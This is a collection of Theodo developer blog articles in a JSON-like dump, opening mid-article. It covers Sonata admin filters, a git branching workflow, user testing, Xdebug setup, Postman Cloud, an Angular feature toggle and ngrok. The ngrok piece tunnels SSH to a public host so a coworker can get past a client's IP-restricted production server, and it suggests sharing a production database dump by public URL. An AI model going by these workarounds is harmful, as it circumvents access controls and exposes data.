when you edit an element and then come back to the list your filters have disappeared.\nThe fix for that is to use Sonata\u2019s persistent parameters: it\u2019s a really handy function that will had your filters to all the Sonata generated links.\nAdd that to your admin class:\npublic function getPersistentParameters()\r\n{\r\n    $parameters = parent::getPersistentParameters();\r\n\r\n    if (!$this->getRequest()) {\r\n        return array();\r\n    }\r\n\r\n    return array_merge($parameters, array(\r\n        'hiddenFilters' => is_array($this->hiddenFilters) ? json_encode($this->hiddenFilters) : $this->hiddenFilters,\r\n    ));\r\n}\r\n\nNotice that we had to JSON_encode our filters because persistent parameters can only be strings.\nThat means we are going to have to change our readHiddenFilters function to decode the JSON:\nprivate function readHiddenFilters()\r\n{\r\n    return is_array($this->getRequest()->query->get('hiddenFilters')) ?\r\n        $this->getRequest()->query->get('hiddenFilters') :\r\n        json_decode($this->getRequest()->query->get('hiddenFilters'), true);\r\n}\r\n\nThat\u2019s it! You have fully customizable and activable hidden filters!\nThe full code : 30 lines\nHere is the full code of working hidden filters:\nclass ApplicationAdmin extends SonataAdmin\r\n{\r\n    private $hiddenFilters;\r\n    \r\n    public function __construct($code, $class, $baseControllerName)\r\n    {\r\n        parent::__construct($code, $class, $baseControllerName);\r\n        $this->hiddenFilters = $this->readHiddenFilters();\r\n    }\r\n    \r\n    private function readHiddenFilters()\r\n    {\r\n        return is_array($this->getRequest()->query->get('hiddenFilters')) ?\r\n            $this->getRequest()->query->get('hiddenFilters') :\r\n            json_decode($this->getRequest()->query->get('hiddenFilters'), true);\r\n    }\r\n    \r\n    public function getPersistentParameters()\r\n    {\r\n        $parameters = parent::getPersistentParameters();\r\n    \r\n        if (!$this->getRequest()) {\r\n            return array();\r\n        }\r\n    \r\n        return array_merge($parameters, array(\r\n            'hiddenFilters' => is_array($this->hiddenFilters) ? json_encode($this->hiddenFilters) : $this->hiddenFilters,\r\n        ));\r\n    }\r\n    \r\n    public function createQuery($context = 'list')\r\n    {\r\n        $query = parent::createQuery($context);\r\n        $rootAlias = $query->getRootAliases()[0];\r\n        \r\n        if (array_key_exists('statusPendingFilter', $this->hiddenFilters) && $this->hiddenFilters['statusPendingFilter']) {\r\n            $query\r\n                ->andWhere($query->expr()->eq($rootAlias . '.status', ':statusPending'))\r\n                ->setParameter('statusPending', Application::STATUS_PENDING)\r\n                ;\r\n        }\r\n        \r\n        return $query;\r\n    }\r\n}\r\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tVictor Duprez\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tOn the project I work, we needed to deploy in production several times a day, for business purposes, but the deployments took one and half hours. Indeed, we are several teams working along with the Scrum methodology, so our product owners are validating all our work. Thus we spent two thirds of our time to identify and isolate what has actually been validated and is ready to go in production.\nWe created a new git workflow, inspired by the article A successful Git branching model, and adapted to the Scrum methodology. It helped us to organise our deployment process and to reduce our deployment time to 30 minutes.\n\nOur workflow is composed by 3 main branches :\n\nThe develop branch can be seen as the Truth : every line of code has been tested and validated by the client.\nThe staging branch corresponds to the validation environment.\nThe release branch contains the last version of your website in production.\nThe feature branches are temporary.\n\nThe Git journey of a simple feature\nLet\u2019s assume Alice and Bob develop an e-commerce website and she needs to register the shipping address of her customers. This feature could be splitting into 3 user-stories : adding a shipping address, editing it and removing it. All the three tickets are in the Sprint Backlog.\nShe starts with the first user story, adding an address. The corresponding ticket is now in the Doing Column.\ngit checkout develop && git pull origin/develop\r\n// She creates a new feature branch and a new user story one\r\ngit checkout -b feature/shipping-address\r\ngit checkout -b add-address\r\n// She codes and commits\n\nIn the meantime, Bob wants to help Alice and starts coding the address deletion.\n// He pulls the last version of the shared branch\r\ngit checkout feature/shipping-address\r\ngit pull origin/feature/shipping-address\r\n// He creates a new branch for the user story\r\ngit checkout -b delete-address\r\n// He codes and commits\r\n\n\nAlice finally finishes her feature locally, she puts the ticket into Code Review.\n// She pushes her code to the staging branch\r\ngit push origin add-address\r\n// She opens a pull request with the staging environment\r\ngit request-pull staging add-address\nOnce Bob has reviewed her code, she can merge her branch into staging. The ticket is now in the Validation column, waiting for the Product Owner validation.\n// She gets the last version of the staging branch\r\ngit checkout staging && git pull origin/staging\r\ngit merge add-address && git push origin staging\r\n// She builds the validation environment \r\n// and asks the product owner to validate\n\nThe product owner has validated Alice\u2019s work, the ticket finally in the Done column. She merge her work into the feature branch and starts another user story.\n// She pulls the last version of the feature branch\r\ngit checkout feature/shipping-address \r\ngit pull origin feature/shipping-address\r\ngit merge add-address && git push origin feature/shipping-address\nWhen the whole feature has been validated by the client, Alice merges the feature branch into develop, as it\u2019s ready to go into production.\n// She gets the last version of the develop branch\r\ngit checkout develop && git pull origin/develop\r\ngit merge feature/shipping-address && git push origin develop\n\nAt the end of the day, when they want to deploy into production, Bob merges develop into release and launches the deployment without any concern. Indeed he knows that all the code on develop is correct. He tags the commit of the release to get the history of each version.\n// He gets the last version of the develop and release branches\r\ngit checkout develop && git pull origin/develop\r\ngit checkout release && git pull origin/release\r\ngit merge develop && git tag 2.1 \r\ngit push origin release --tags\n\nThe four rules of this workflow\nThis workflow can seem to be heavy but after few days you become use to it.\nNevertheless, you have to remember four rules:\n\nBe strict : no inopportune commit on develop and not staging.\nStay tuned : a feature is not done anymore right after the product owner validation, you need to merge your branch into develop to prepare the next release.\nBe clean : as it can drift apart, you should clean the staging repository every week. You should delete the staging branch, locally and remotely, and recreate it from develop :\ngit co develop && git pull origin/develop\r\ngit branch -d staging && git push origin --delete staging\r\ngit co -b staging && git pull origin staging\n\nDivide and Conquer : two features should be really distinct. Either they don\u2019t use the same part of the code, either they are not developed at the same time. Yet, some conflicts could still happen between two user story branches, don\u2019t panic. Let\u2019s take an example. Alice and Bob have both added a translation at the same line in the translation file. Bob have merged his branch into staging before Alice, thus when she want to push she has conflicts with staging. What she could do is to pull the staging branch, merge her branch into it. Then she had to resolve the conflicts and my advice is to do it with Bob to address them together. Then she can push the merge branch to staging :\ngit co staging && git pull origin/staging\r\ngit merge alices-branch\r\n// Resolving conflicts\r\ngit commit\r\ngit push origin staging\n\n\n\u00a0\n\u00a0\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAurore Malherbes\r\n  \t\t\t\r\n  \t\t\t\tWeb Developer at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tJ\u2019ai rencontr\u00e9 S\u00e9bastien Tanguy, co-fondateur de Testapic, au canada durant le WAQ 2016. Nous faisions tout les deux partie de la d\u00e9l\u00e9gation fran\u00e7aise \u00e0 d\u00e9coller pour la semaine du num\u00e9rique du Qu\u00e9bec. J\u2019ai eu l\u2019occasion d\u2019assister \u00e0 sa conf\u00e9rence au WAQ sur les tests utilisateurs physiques et distants. C\u2019\u00e9tait l\u2019un des talks les plus formateurs de ces 3 jours de conf\u00e9rences !\nLes sketchnotes de C\u00e9line Rouqui\u00e9 r\u00e9sument tr\u00e8s bien le talk de S\u00e9bastien.\nTests utilisateurs physiques et distants : r\u00e9sum\u00e9 en sketch de la conf\u00e9rence @testapic #WAQ16 pic.twitter.com/0hEnoZohnX\n\u2014 C\u00e9line Rouqui\u00e9 (@CelineRouquie) April 6, 2016\n\nComme nous, Testapic place l\u2019utilisateur au centre de la conception d\u2019une application, alors \u00e0 notre retour \u00e0 Paris, j\u2019ai demand\u00e9 \u00e0 S\u00e9bastien s\u2019il pouvait partager avec nous son exp\u00e9rience. Voici la vid\u00e9o du Brown Bag Lunch \u00e0 Theodo :\n\nEn bonus, S\u00e9bastien nous partage 6 conseils sur les tests utilisateurs.\n\u201cTestapic, cr\u00e9\u00e9e en 2011 par 4 passionn\u00e9s du Web, du design et de la conversion, est l\u2019expert fran\u00e7ais du test utilisateur distant. Nous pla\u00e7ons l\u2019utilisateur au centre de la d\u00e9marche de conception (ergonomie et UX) et d\u2019optimisation sur des interfaces web et mobile (web mobile ou natif) en production (conversion). Testapic r\u00e9alise des tests quantitatifs mais aussi qualitatifs, avec des tests vid\u00e9os comment\u00e9es sur ordinateur, smartphone et tablette \u00e0 partir d\u2019un panel de +100 000 utilisateurs qualifi\u00e9s et repr\u00e9sentatifs des internautes fran\u00e7ais.\nVoici quelques conseils :\n\nSachez ce que vous voulez tester : d\u00e9finissez un cadrage et formalisez les objectifs et les hypoth\u00e8ses de test\nAdressez un public cible pr\u00e9cis : Mme Michu n\u2019existe pas\u2026 Mieux vaut tester des personas identifi\u00e9s et cibl\u00e9s\nFaites appel \u00e0 des professionnels du test pour les r\u00e9aliser : que ce soit en pr\u00e9sentiel ou \u00e0 distance, il n\u2019y aurait rien de pire que de biaiser un test en le r\u00e9alisant soit m\u00eame sans avoir conscience des biais ou limites \u00e9ventuelles\nAnalysez de fa\u00e7on structur\u00e9e avec des m\u00e9triques fiables. Cela pr\u00e9suppose de savoir quoi mesurer et de le mesurer convenablement.\nFormalisez de fa\u00e7on objective les conclusions en les appuyant sur des donn\u00e9es utilisateurs irr\u00e9futables\nSachez communiquer les r\u00e9sultats en fonction de l\u2019audience : op\u00e9rationnels et top managers ne s\u2019attendent pas au m\u00eame niveau de d\u00e9tail\n\nEnfin dernier conseil pour structurer votre approche de user test :\nConstatez, testez, analysez, corrigez, testez, \u2026 #rouededeming\u201d\nMerci beaucoup S\u00e9bastien.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tJonathan Beurel\r\n  \t\t\t\r\n  \t\t\t\tJonathan Beurel - Web Developer. Twitter : @jonathanbeurel  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWarning: this article concerns php5 version. If your PHP version is different, replace php5 by php/X.Y in paths (X.Y is your PHP version) and phpX.Y in command. For example :\n\nsudo apt-get install php5-xdebug becomes sudo apt-get install php5.6-xdebug\n/etc/php5/mods-available/xdebug.ini becomes\u00a0/etc/php/5.6/mods-available/xdebug.ini\n\nI love debuggers. They allow me to understand deep down in my code why something doesn\u2019t work, and\u00a0are even more useful when I work on legacy projects.\nWhen I work on the client side, the browser already provides me all the tools I need to dig deeper\u00a0than some console.log() scattered semi-randomly in the source code.\nHowever, I struggled to configure my workspace when I worked on a PHP Symfony2 project hosted in a\u00a0Vagrant virtual machine.\nStep1: Install Xdebug on your Vagrant virtual machine\nThat may seem obvious, but you need to have Xdebug installed on your virtual machine to benefit \u00a0from its services.\nsudo apt-get install php5-xdebug\r\n\nThen, configure it:\nsudo vim /etc/php5/mods-available/xdebug.ini\r\n\nwith the following lines:\nxdebug.remote_enable=true\r\nxdebug.remote_connect_back=true\r\nxdebug.idekey=MY_AWESOME_KEY\r\n\nFinally, if you use php5-fpm, you need to restart it:\nsudo service php5-fpm restart\r\n# or with\r\nsudo /etc/init.d/php5-fpm restart\r\n\nIf you use Ansible to provision your virtual machine, you can also use a ready-to-action Xdebug role.\n\nStep2: Configure PhpStorm\nFirst, select the \u201cEdit configurations\u201d item in the \u201cRun\u201d menu.\n\nThen, add a new \u201cPHP Remote Debug\u201d configuration.\n\nWe will use the IDE key configured in your Vagrant and in your browser.\nTo fully configure this debugger configuration, you will need to create what PhpStorm calls a\u00a0server.\n\n\nFill the correct hostname\nCheck \u201cUse path mappings\u201d checkbox, and write the project\u2019s absolute path\non your Vagrant virtual machine\n\n\nStep3: Configure Xdebug\nUse\u00a0Xdebug to debug your web application on Chrome\nNow that Vagrant with Xdebug is up and running, let\u2019s configure Xdebug Chrome extension.\nFirst, we need to install it from Chrome Web Store\nMake sure that the extension is enabled on your browser\u2019s extensions list page.\n\nNow, you should see on the right side of the address bar the extension\u2019s symbol.\n\nRight-click on it, then click on the \u201cOptions\u201d sub-menu.\n\nYou have to use the IDE key previously set.\n\nXdebug plugin also exists for other browsers.\nFinally, in your browser click on the bug in your address bar to switch to the \u201cDebug\u201d mode\n\nUse Xdebug to debug your APIs route with Postman\nOnce your Xdebug configuration is added, you need to add ?XDEBUG_SESSION_START=<XDEBUG_KEYNAME> at the end of your route. And that\u2019s all!\n\nUse Xdebug to debug commands or unit tests\nTo use Xdebug for debugging commands or unit tests, first, you need to add xdebug.remote_autostart=true in XDebug configuration file of your Vagrant xdebug.ini.\nThen, you need to specify the xdebug.remote_host (IP address of your local from your Vagrant) when launching the command from the virtual machine\u2019s terminal.\n\nFirst, get the host IP address by using ifconfig from your local terminal (the host) :\n\n\n\nThen, launch your command\n\nphp -d xdebug.remote_host=10.0.0.1 your_command\r\n\nFor instance, if you want to debug your unit tests in a Symfony project, you can run:\nphp -d xdebug.remote_host=10.0.0.1 ./bin/phpunit -c app/\nStep4: Enjoy!\nNow, in PhpStorm you:\n\nAdd your breakpoints by clicking to the left of the lines\n\n\n\nClick on the bug icon on the upper-right corner\n\n\n\u00a0\nYou should now be able to break on the exact line you selected in your IDE.\nBonus: Performance\nYou need to know that enabling Xdebug slows down your app (x2), the fastest way to disable it is to run the following command: php5dismod xdebug\nUse php5enmod xdebug to enable it back. Each time you\u2019ll also need to restart php-fpm or apache.\nTroubleshooting: I did the tutorial but Xdebug doesn\u2019t work\nIt\u2019s probably because a symbolic link is missing in your php conf.\n\nFirst type in your virtual machine php -i | grep xdebug\n\nIf you have no response, it means Xdebug is not set correctly\n\nThen check if Xdebug is mentioned when running php -v from your Vagrant.\nIf not, add a symbolic link to specify that the Xdebug module should be enabled, for instance (you may need sudo):\n\nln -s /etc/php5/mods-available/xdebug.ini /etc/php5/fpm/conf.d/20-xdebug.ini\r\nln -s /etc/php5/mods-available/xdebug.ini /etc/php5/cli/conf.d/20-xdebug.ini\r\n\n\nYou should obtain by running php -v\n\n\nI hope you\u2019ve made your way through the process and that it will improve your efficiency as much\u00a0as it does for me. If you have other ways to configure your debugger, feel free to share them in\u00a0the comments section below.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tYann Jacquot\r\n  \t\t\t\r\n  \t\t\t\tYann Jacquot is an agile web developer at Theodo.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tNicolas Boutin\r\n  \t\t\t\r\n  \t\t\t\tNicolas is a former entrepreneur and a web agile developer. After making all the mistakes launching his first startup in SME's digital transformation he joined Theodo to learn how to build web and mobile applications keeping customers satisfied. Symfony + APIPlatform + React is his favorite stack to develop fast and easy to maintain app. He's still eager to start a new venture.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhen working on a project with both an API and a frontend, it\u2019s more convenient\u00a0to work on both at the same time, as they can influence one another.\u00a0I was recently working on an API with a mobile development team, and we lost some valuable time asking each other about the format for a certain request, and retyping the same requests for ten-times-a-day operations such as logging in as our test user.\nWe were using Postman \u2013 which you\u2019ve most probably heard of it you\u2019ve worked with or on an API \u2013 to run HTTP requests, and keep a history of our past requests.\u00a0I stopped counting how many times I tried to reuse an obsolete request, got a 4XX-5XX, and thought something was wrong.\u00a0And one fine morning, I realized that Postman had a Collections tab next to the History tab, and offered cloud storage to save requests and share them with your team.\nThe whole team sharing thing is a paid feature called Postman Cloud.\u00a0It costs $5 per active team member per month, with a free 30-day trial period with unlimited users.\u00a0It offers nice little extras such as auto-generated documentation.\u00a0In this article, I will walk you through the process of setting up Postman Cloud, keeping and sharing your API requests and documenting your endpoints.\nSetup Account and Team\nMost Postman users don\u2019t have a Postman account because you don\u2019t need one to use the app.\u00a0Assuming you\u2019ve installed Postman, the first thing to do is to create your account.\nThen, subscribe to Postman Cloud or the free trial period from the Pricing page.\u00a0Then go to the team page and start adding people to your team.\u00a0If they already have a Postman account, make sure to use the right email.\nOnce you have your account set up and confirmed, you can launch the app and log in from the top right corner.\nYou\u2019re logged in!\nPro Tip: There is an OSX desktop app (direct download) if you\u2019re on a Mac, which solves a strange window switching issue I had with the Chrome app.\nOrganize your requests into Collections and Environments\nThe first thing to notice is that you have a Collections tab on the left menu bar. There, you can create a new Collection.\u00a0This will hold all your requests for a project.\u00a0When you are logged in, your Collections are automatically uploaded to your account.\nThe three dots menu next to the Collection allows you to edit it, share it with your team with read or write access and create a subfolder hierarchy inside your Collection.\nCreate a new request as usual: choose the method, enter the endpoint, the body and any custom headers.\u00a0Next to the button that executes your request, there is a \u201cSave\u201d button to save it into a Collection.\u00a0Give it a meaningful name, choose the collection and possibly a subfolder to save it into, and you\u2019re done!\u00a0The request is uploaded and shared with the team.\u00a0They see your Collection just like one of their own (note the self-explanatory \u201cMe\u201d / \u201cTeam\u201d filter above the Collections list).\nYour new Collection\nNow, you probably worked on more than one server. That\u2019s where\u00a0Postman Environments come in.\nThis feature lets you use variables inside your requests and define multiple Environments with their own value for each variable.\u00a0Environments can be chosen and managed from the menu next to the eye icon at the top right (in the second row of icons).\u00a0You can create one or more Environments, in which you set a value for a variable called\u00a0hostname, and use it in your request URL with double curly braces: https://{{hostname}}/endpoint.\u00a0Then, before running the request, pick an Environment from the menu and Postman will use the correct value.\u00a0You can also choose to share an Environment with your team, just like the Collection.\nDocument and Publish your API\nFrom your Collections page on the Postman website, you can choose to view the documentation for your Collection.\u00a0This generates a web page which displays your Collection very nicely, with the folder hierarchy, request details and multi-language examples next to one another.\u00a0On the top right, you can switch between Environments, and the \u00abRun in Postman\u00bb button opens the viewer\u2019s Postman app and gives them (readonly) access to your requests so they can try them with one click.\u00a0Note that for the moment, only the team can see this page.\nLooks nice, right?\nHere\u2019s how to make it even better:\n\nAdd helpful descriptions to each request.\u00a0From Postman, in the three-dots menu next to each saved request, you can edit\u00a0it and add a description.\u00a0You can also add a description to each subfolder, and to the Collection itself.\u00a0You can even unleash the full power of Markdown to make those descriptions look better.\nGive\u00a0example responses for each request, so that users\u00a0know what response format(s) to expect.\u00a0To do this, run your request and get an actual response. Then click\u00a0\u201cSave Response\u201d button in\u00a0the top right corner of the response box, and give it a meaningful name (ex: \u201cNormal Response\u201d or \u201cError Response\u201d).\u00a0It gets uploaded and shows in the doc just below the request. You can save any number of\u00a0response per requests.\n\nAs you get to production, you can Publish your API reference from your dashboard.\u00a0If you have multiple Environments, you can choose the one that will be used for the published doc.\u00a0Publication means that any user with the link can view the documentation, use it and import your Collection to their own Postman using the \u00abRun in Postman\u00bb button.\nThe ultimate example of documented API is the Postman Cloud API itself, which the Postman client uses to sync your Collections.\u00a0(Yes, it\u2019s an API to store data about APIs :O)\u00a0As a Postman Cloud user, you can use the \u201cRun in Postman\u201d button to import the doc into Postman, play with it (get the API key from your dashboard) and see for yourself how they created this full-featured API reference.\nAreas for Improvement\nHere are a few things I believe are most important for Postman Cloud to improve:\n\nAllow response editing: Before I save a response as a sample response for my documentation, I might need to anonymize the data in the response. I need to be able to edit the response before I save it.\nClarify teams and organizations: I believe basic team sharing should be free, but as a paid feature I would want to be part of multiple teams within an organization, \u00e0 la Github.\nAllow me to self-host the doc: Allow me to download or integrate the documentation into my website, or give me more control over the URL of my documentation, and I would look more professionnal when publicizing\u00a0the link to my users.\nControl public doc change: As the team develops the API, some requests may be shared between them, yet not ready for public consumption. We need a way to prevent specific requests from appearing in the doc, or better, only manually update the public documentation when ready to do so.\n\nBottom Line\nI believe Postman Cloud is a tool that can really make your life easier when building an API, especially when front-end development happens simultaneously (which it should).\u00a0The price tag may seem odd\u00a0to a user, but a company can easily administrate a team with a fluctuating number of users.\u00a0However, the team system deserves some rethinking so that people can be in multiple teams and share different things with different coworkers.\nI\u2019ve only used it for two weeks, so I would be happy to hear about your use cases and how well Postman Cloud fits them. Please feel free to comment here or chat with me on Twitter!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tFoucauld Degeorges\r\n  \t\t\t\r\n  \t\t\t\tSoftware Architect and Developer at Theodo.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhat is feature toggling?\nFeature toggling enables you to toggle features or change your application\u2019s content quickly and without any change to the application source code.\nIt can be used for various applications such as A/B testing or to display time-limited content such as special offers on an application.\nIf you want to know more about feature toggling, I recommand this thorough article from Martin Fowler.\nWhile I was building an Angular application, my Product Owner asked me to implement feature toggling on several features.\nWhile there were plenty of nice directives available around, it felt a bit like using a sledgehammer to crack a nut, so I believed I could build a simpler one.\nMy team wasn\u2019t in charge of the back-end of the application and they had already implemented the admin interface to set the toggles as well as the API to get them when I started.\nThe API was returning a JSON file that looked like this one:\n{\r\n  showSignUpLink: true\r\n}\nSo my job was to get this JSON file, and use it to show or hide the link to the sign up page on the login one.\nCreating a new directive\nOk, first let\u2019s add a call to the API that will get the JSON file with the features:\napp.factory('Features', function($resource) {\r\n  $resource('/features');\r\n});\nThat makes 3 lines of code, that is the minimal setup to get a resource.\nNow, we want to hide this link when the \u2018showSignUpLink\u2019 attribute of our JSON file is set to false.\nTo do this let\u2019s create a directive that will take the name of the JSON attribute we have to look for:\napp.directive('featureToggle', function(Features) {\r\n  return {\r\n    restrict: 'E',\r\n    scope: {\r\n      featureName: '@'\r\n    },\r\n    template: '<span ng-transclude></span>',\r\n    transclude: true,\r\n    link: function(scope, element, attrs, ctrl, transclude) {\r\n      Features.get().$promise.then(function(response) {\r\n        scope.$parent.dataFeature = response[scope.featureName];\r\n      });\r\n    }\r\n  };\r\n});\nAll right, now we\u2019re at 3 + 15 = 18 lines.\nBut what are we doing here?\nWe are creating a directive that can only be created as an element \u2013 i.e. as <feature-toggle>\u00a0\u2013 which has one attribute called featureName and which template is a <span>\u00a0element that implements ng-tranclude.\nSo basically everything that is inside the <feature-toggle>\u00a0element will be inside a\u00a0<span> once the DOM is rendered. As an example:\n<feature-toggle>\r\n  <marquee>I am a forgotten HTML element</marquee>\r\n</feature-toggle>\nwill become:\n<span ng-transclude>\r\n  <marquee>I am a forgotten HTML element</marquee&gt\r\n</span>\nThen, using the link method we can update the DOM inside the directive.\nHere, we simply get the \u2018Features\u2019 resource and set the \u2018dataFeature\u2019 attribute of the directive\u2019s parent scope \u2013 i.e. the controller\u2019s scope \u2013 to the value stored in\u00a0the \u2018feature-name\u2019 key.\nUsing the directive in the view\nLet\u2019s see why our directive is so awesome by looking at how we will transform our link. So starting from this:\n<a href=\"/signup\">Yo sign up here</a>\nWe do now have that:\n<feature-toggle feature-name=\"showSignUpLink\">\r\n  <a href=\"/signup\">Yo sign up here</a>\r\n<feature-toggle>\nNow when the controller is loaded, \u2018dataFeature\u2019 will be whatever you decided in the controller that renders the view \u2013 if you don\u2019t declare it, the link won\u2019t be shown.\nOnce the directive gets the response from the API, it will change the value of \u2018dataFeature\u2019 and the link will appear (or not).\nAnd that\u2019s it! We added 2 more lines and 3 + 15 + 2 = 20 so here we are with our first feature toggle with only 20 lines of code!\nGoing further: Display the content of the JSON file in the DOM\nAll right, now let\u2019s do something awesome with our directive.\nIn the same application, the second feature I was asked to make togglable was the content of the main menu.\nActually it wasn\u2019t a toggle, but more of an admin-editable content. The API was then returning this:\n{\r\n  showSignUpLink: true,\r\n  menu: [\r\n    {\r\n      stateName: 'landing',\r\n      label: 'Home'\r\n    },\r\n    {\r\n      stateName: 'posts',\r\n      label: 'Posts'\r\n    },\r\n    {\r\n      stateName: 'categories',\r\n      label: 'Categories'\r\n    },\r\n    {\r\n      stateName: 'users',\r\n      label: 'Users'\r\n    }\r\n  ]\r\n}\nLet\u2019s have a look at what the HTML for my menu was looking like before:\n<ul class=\"navbar-nav\">\r\n  <li>\r\n    <a>Home</a>\r\n  </li>\r\n  <li>\r\n    <a>Posts</a>\r\n  </li>\r\n  <li>\r\n    <a>Categories</a>\r\n  </li>\r\n  <li>\r\n    <a>Users</a>\r\n  </li>\r\n</ul>\nWhat\u2019s great is that I didn\u2019t have to make any change to my directive at all!\nAll is in the HTML:\n<ul class=\"navbar-nav\">\r\n  <li>\r\n    <a>{{ state.label }}</a>\r\n  </li>\r\n</ul>\nConclusion\nThis is how the directive of my application actually kinda looks like right now.\nI like the fact that it is very simple and yet I can do a bit more than just feature toggling.\nIf you enjoyed this article, you may also want to check out Sammy Teillet\u2019s one on A/B testing.\nI also welcome any comment or suggestion on this article, please let me know if you believe it could be improved.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tLouis Zawadzki\r\n  \t\t\t\r\n  \t\t\t\tI drink tea and build web apps at Theodo.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tHave you ever wanted to expose a local server to the entire internet? It may sound scary but can be really useful. Use-cases are infinite, here are a few:\n\nYou are developing a web application on your computer and you need to see instantly your modifications on a specific device or browser (smartphone, tablet, internet explorer\u2026) without deploying it again and again.\nYou are developing an application which works with webhooks, for example GitHub webhooks.\nYou need to download some files from a coworker computer and you\u2019re far from him, or simply don\u2019t want to bother with a USB key.\nYou are out of the office and need to access an IP filtered server.\n\nMultiple solutions exist, open-source or not but my favorite is ngrok and you can learn to use it in just 2 minutes. Installation is quite easy, head over to https://ngrok.com/download and follow instructions.\nWhat does it do?\nIn two words: it takes a local port number in input, and offers you a unique URL, accessible by anyone. For example, let\u2019s assume you are building a very basic web application in php\necho \"Hello World\" > index.php\r\nphp -S localhost:8000\nNow a web server is running your computer\u2019s port 8000. When you hit http://localhost:8000 on a browser, you can see your application.\n\nHow to expose it to the world? It\u2019s simple, just type:\nngrok http 8000\nAfter a few seconds, ngrok will output a few informations, the most important one being \u201cForwarding\u201d: You now have a unique public URL bound to your local server. Paste it, share it, anyone can use it.\n\n\nReal-life use-cases\nMaking bugfix easier on mobile devices\nEver had this weird bug on this specific device that you can\u2019t reproduce anywhere else? Your responsive website is displaying badly on your blackberry\u2019s boss? Sometimes you just don\u2019t know what is the issue and need to code in the dark, test something, see what is happening and repeat. ngrok eases this kind of workflow by preventing you to deploy your modifications again and again.\nDeveloping with webhooks\nWebhooks are everywhere, GitHub, Slack, Mandrill, Trello, many applications use them. They allow you to build tools that will be notified when an event occurs. But these applications need public URL to send the payloads to. Tunneling your local environment with ngrok will help you during development process. The GitHub documentation is a good start if you want to get into it.\nDowload a large file from a remote coworker\u2019s computer\nYour coworker has downloaded a large file and you want to get it? It can be anything, latest dump of your production database, a base virtual machine, heavy CSV. With ngrok, you can simply run a server (for example PHP built-in server) and expose your file:\n\nPut your largefile.avi file into a folder\nRun php -S localhost:8000 on that folder\nRun ngrok http 8000 (let\u2019s assume generated URL is\u00a0https://bc153101.ngrok.io)\nShare the url https://bc153101.ngrok.io/largefile.avi\n\nAccess a secure server\nTwo weeks ago a\u00a0coworker was out of the office and needed to quickly access one of his client\u2019s production server which is IP restricted. How do we managed to do that?\n\nFirst I created him\u00a0an account coworker\u00a0on my\u00a0laptop\nThen I\u00a0used ngrok to expose my\u00a0SSH server: ngrok tcp 22. The result was: tcp://0.tcp.ngrok.io:15602\nHe\u00a0logged into my\u00a0machine with: ssh -A -p 15602 coworker@0.tcp.ngrok.io. The -A\u00a0option ensured its\u00a0SSH public key was forwarded in order to log into the production server.\nThen he was able to run ssh hisclientserver\n\nConclusion\n\u201dI want to expose a local server behind a NAT or firewall to the internet\u201d. The ngrok promise is simple yet powerful. You should definitively think about it next time you struggle with public/private networks, firewalls or just want to get your local environment available to someone. And of course please remain careful with what you expose, and to whom.\nAny other use-case comes to your mind? Please feel free to tell us in the comment section.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good 